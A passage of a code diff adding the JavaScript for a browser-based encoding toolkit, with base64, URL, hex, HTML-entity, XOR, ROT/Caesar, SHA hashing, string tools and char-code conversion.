+      while (val.length % 4) val += '=';
+    }
+    document.getElementById('b64-out').value = decodeURIComponent(escape(atob(val)));
+  } catch(e) { notice('b64-notice','notice-err','Decoding failed — invalid base64.'); }
+}
+
+// ═══════════════════════════════════════════════
+// URL ENCODE
+// ═══════════════════════════════════════════════
+function urlEncode() {
+  const val = document.getElementById('url-in').value;
+  const mode = document.getElementById('url-mode').value;
+  let out;
+  if (mode === 'component') out = encodeURIComponent(val);
+  else if (mode === 'full') {
+    out = Array.from(val).map(c => {
+      const code = c.charCodeAt(0);
+      if ((code >= 0x30 && code <= 0x39) || (code >= 0x41 && code <= 0x5A) || (code >= 0x61 && code <= 0x7A) || '-_.~'.includes(c)) return c;
+      return '%' + code.toString(16).toUpperCase().padStart(2,'0');
+    }).join('');
+  } else {
+    out = Array.from(encodeURIComponent(val)).map(c => c === '%' ? '%25' : c).join('');
+  }
+  document.getElementById('url-out').value = out;
+}
+function urlDecode() {
+  try {
+    document.getElementById('url-out').value = decodeURIComponent(document.getElementById('url-in').value);
+  } catch(e) { notice('url-notice','notice-err','Decode failed — malformed percent encoding.'); }
+}
+
+// ═══════════════════════════════════════════════
+// HEX
+// ═══════════════════════════════════════════════
+function hexEncode() {
+  const val = document.getElementById('hex-in').value;
+  const sep = document.getElementById('hex-sep').value;
+  const upper = document.getElementById('hex-case').value === 'upper';
+  let bytes = Array.from(val).map(c => {
+    let h = c.charCodeAt(0).toString(16).padStart(2,'0');
+    return upper ? h.toUpperCase() : h;
+  });
+  let out;
+  if (sep === ' ') out = bytes.join(' ');
+  else if (sep === '') out = bytes.join('');
+  else if (sep === '\\x') out = bytes.map(b => '\\x' + b).join('');
+  else out = bytes.map(b => '0x' + b).join(',');
+  document.getElementById('hex-out').value = out;
+}
+function hexDecode() {
+  let val = document.getElementById('hex-in').value.trim();
+  try {
+    val = val.replace(/\\x/g,'').replace(/0x/gi,'').replace(/,/g,' ').replace(/\s+/g,' ').trim();
+    const bytes = val.split(' ');
+    document.getElementById('hex-out').value = bytes.map(b => String.fromCharCode(parseInt(b,16))).join('');
+  } catch(e) { notice('hex-notice','notice-err','Decode failed — check hex format.'); }
+}
+
+// ═══════════════════════════════════════════════
+// HTML ENTITY
+// ═══════════════════════════════════════════════
+const HTML_NAMED = {'<':'&lt;','>':'&gt;','&':'&amp;','"':'&quot;',"'":'&#x27;'};
+function htmlEncode() {
+  const val = document.getElementById('html-in').value;
+  const mode = document.getElementById('html-mode').value;
+  let out;
+  if (mode === 'named') {
+    out = val.replace(/[<>&"']/g, c => HTML_NAMED[c] || c);
+  } else if (mode === 'dec') {
+    out = val.replace(/[<>&"']/g, c => '&#' + c.charCodeAt(0) + ';');
+  } else if (mode === 'hex') {
+    out = val.replace(/[<>&"']/g, c => '&#x' + c.charCodeAt(0).toString(16) + ';');
+  } else if (mode === 'all-dec') {
+    out = Array.from(val).map(c => '&#' + c.charCodeAt(0) + ';').join('');
+  } else {
+    out = Array.from(val).map(c => '&#x' + c.charCodeAt(0).toString(16) + ';').join('');
+  }
+  document.getElementById('html-out').value = out;
+}
+function htmlDecode() {
+  const el = document.createElement('textarea');
+  el.innerHTML = document.getElementById('html-in').value;
+  document.getElementById('html-out').value = el.value;
+}
+
+// ═══════════════════════════════════════════════
+// XOR
+// ═══════════════════════════════════════════════
+function getXorKey() {
+  const raw = document.getElementById('xor-key').value.trim();
+  const mode = document.getElementById('xor-keymode').value;
+  if (mode === 'str') return Array.from(raw).map(c => c.charCodeAt(0));
+  if (raw.startsWith('0x') || raw.startsWith('0X')) return [parseInt(raw, 16)];
+  if (!isNaN(raw)) return [parseInt(raw)];
+  return Array.from(raw).map(c => c.charCodeAt(0));
+}
+
+function xorProcess(dir) {
+  const keyArr = getXorKey();
+  const mode = document.getElementById('xor-keymode').value;
+  const outFmt = document.getElementById('xor-outfmt').value;
+  let inputBytes;
+
+  if (dir === 'dec') {
+    // Input is hex bytes
+    const val = document.getElementById('xor-in').value.trim()
+      .replace(/\\x/g,'').replace(/0x/gi,'').replace(/,/g,' ').replace(/\s+/g,' ').trim();
+    inputBytes = val.split(' ').map(b => parseInt(b, 16));
+  } else {
+    inputBytes = Array.from(document.getElementById('xor-in').value).map(c => c.charCodeAt(0));
+  }
+
+  if (!inputBytes.length) { notice('xor-notice','notice-warn','No input.'); return; }
+
+  const result = inputBytes.map((b, i) => {
+    let k;
+    if (mode === 'rolling') {
+      k = (keyArr[0] + i) & 0xFF;
+    } else {
+      k = keyArr[i % keyArr.length];
+    }
+    return b ^ k;
+  });
+
+  let out;
+  if (outFmt === 'hex') {
+    out = result.map(b => b.toString(16).padStart(2,'0')).join(' ');
+  } else if (outFmt === 'b64') {
+    out = btoa(result.map(b => String.fromCharCode(b)).join(''));
+  } else {
+    out = result.map(b => String.fromCharCode(b)).join('');
+  }
+  document.getElementById('xor-out').value = out;
+  notice('xor-notice','notice-ok',`${dir === 'enc' ? 'Encrypted' : 'Decrypted'} ${inputBytes.length} bytes`);
+}
+
+// ═══════════════════════════════════════════════
+// ROT
+// ═══════════════════════════════════════════════
+function rotApply() {
+  const val = document.getElementById('rot-in').value;
+  const n = parseInt(document.getElementById('rot-n').value) || 13;
+  const charset = document.getElementById('rot-charset').value;
+  let out;
+  if (charset === 'alpha') {
+    out = val.replace(/[a-zA-Z]/g, c => {
+      const base = c >= 'a' ? 97 : 65;
+      return String.fromCharCode(((c.charCodeAt(0) - base + n) % 26) + base);
+    });
+  } else {
+    // All printable ASCII (0x20–0x7E = 95 chars)
+    out = val.replace(/[\x20-\x7e]/g, c => {
+      return String.fromCharCode(((c.charCodeAt(0) - 0x20 + n) % 95) + 0x20);
+    });
+  }
+  document.getElementById('rot-out').value = out;
+}
+
+// ═══════════════════════════════════════════════
+// CAESAR
+// ═══════════════════════════════════════════════
+function caesarShift(text, shift) {
+  shift = ((shift % 26) + 26) % 26;
+  return text.replace(/[a-zA-Z]/g, c => {
+    const base = c >= 'a' ? 97 : 65;
+    return String.fromCharCode(((c.charCodeAt(0) - base + shift) % 26) + base);
+  });
+}
+function caesarEnc() {
+  const shift = parseInt(document.getElementById('cae-shift').value) || 3;
+  document.getElementById('cae-out').value = caesarShift(document.getElementById('cae-in').value, shift);
+}
+function caesarDec() {
+  const shift = parseInt(document.getElementById('cae-shift').value) || 3;
+  document.getElementById('cae-out').value = caesarShift(document.getElementById('cae-in').value, 26 - shift);
+}
+function caesarBrute() {
+  const val = document.getElementById('cae-in').value;
+  let lines = '';
+  for (let i = 1; i <= 25; i++) {
+    lines += `ROT-${String(i).padStart(2,'0')}: ${caesarShift(val, i)}\n`;
+  }
+  document.getElementById('cae-out').value = lines.trim();
+}
+
+// ═══════════════════════════════════════════════
+// HASH
+// ═══════════════════════════════════════════════
+async function computeHashes() {
+  const val = document.getElementById('hash-in').value;
+  if (!val) return;
+  const enc = new TextEncoder();
+  const data = enc.encode(val);
+  const algos = ['SHA-1','SHA-256','SHA-384','SHA-512'];
+  const results = await Promise.all(algos.map(async a => {
+    const buf = await crypto.subtle.digest(a, data);
+    const hex = Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2,'0')).join('');
+    return { name: a, hex };
+  }));
+  const container = document.getElementById('hash-results');
+  container.innerHTML = results.map(r => `
+    <div class="hash-row">
+      <div class="hash-name">${r.name}</div>
+      <div class="hash-val" title="${r.hex}">${r.hex}</div>
+      <button class="btn btn-ghost" onclick="navigator.clipboard.writeText('${r.hex}')">Copy</button>
+    </div>`).join('');
+}
+
+// ═══════════════════════════════════════════════
+// STRING TOOLS
+// ═══════════════════════════════════════════════
+function strTool(op) {
+  const val = document.getElementById('str-in').value;
+  let out = val;
+  switch(op) {
+    case 'reverse': out = val.split('').reverse().join(''); break;
+    case 'upper':   out = val.toUpperCase(); break;
+    case 'lower':   out = val.toLowerCase(); break;
+    case 'title':   out = val.replace(/\b\w/g, c => c.toUpperCase()); break;
+    case 'trim':    out = val.split('\n').map(l => l.trim()).join('\n').trim(); break;
+    case 'dedupe':  out = [...new Set(val.split('\n'))].join('\n'); break;
+    case 'sort':    out = val.split('\n').sort((a,b) => a.localeCompare(b)).join('\n'); break;
+    case 'sortz':   out = val.split('\n').sort((a,b) => b.localeCompare(a)).join('\n'); break;
+    case 'linerev': out = val.split('\n').reverse().join('\n'); break;
+    case 'count':
+      const chars = val.length;
+      const words = val.trim() ? val.trim().split(/\s+/).length : 0;
+      const lines = val.split('\n').length;
+      out = `Characters: ${chars}\nWords: ${words}\nLines: ${lines}\n\n${val}`;
+      break;
+  }
+  document.getElementById('str-out').value = out;
+}
+
+// ═══════════════════════════════════════════════
+// CHAR CODE
+// ═══════════════════════════════════════════════
+function charEncode() {
+  const val = document.getElementById('cc-in').value;
+  const fmt = document.getElementById('cc-fmt').value;
+  const codes = Array.from(val).map(c => c.charCodeAt(0));
+  let out;
+  if (fmt === 'dec') out = codes.join(', ');
+  else if (fmt === 'hex') out = codes.map(c => '0x' + c.toString(16).padStart(2,'0')).join(', ');
+  else if (fmt === 'jsarr') out = '[' + codes.map(c => '0x' + c.toString(16).padStart(2,'0')).join(', ') + ']';
+  else if (fmt === 'csharp') out = 'new byte[] { ' + codes.map(c => '0x' + c.toString(16).padStart(2,'0').toUpperCase()).join(', ') + ' }';
+  else out = 'String.fromCharCode(' + codes.join(', ') + ')';
+  document.getElementById('cc-out').value = out;
+}
+function charDecode() {
+  let val = document.getElementById('cc-in').value.trim();
+  try {
+    val = val.replace(/String\.fromCharCode\(|\)/g,'').replace(/\[|\]/g,'').replace(/new byte\[\]\s*\{|\}/g,'');
+    const codes = val.split(/[\s,]+/).filter(Boolean).map(v => {
+      v = v.trim();
+      if (v.startsWith('0x') || v.startsWith('0X')) return parseInt(v, 16);
+      return parseInt(v);
+    });
+    document.getElementById('cc-out').value = codes.map(c => String.fromCharCode(c)).join('');
+  } catch(e) { notice('cc-notice','notice-err','Parse failed.'); }
+}
+
+// ═══════════════════════════════════════════════
+// INIT
+// ═══════════════════════════════════════════════
+buildDash();
+navigate('home');
+</script>
 </body>
 </html>
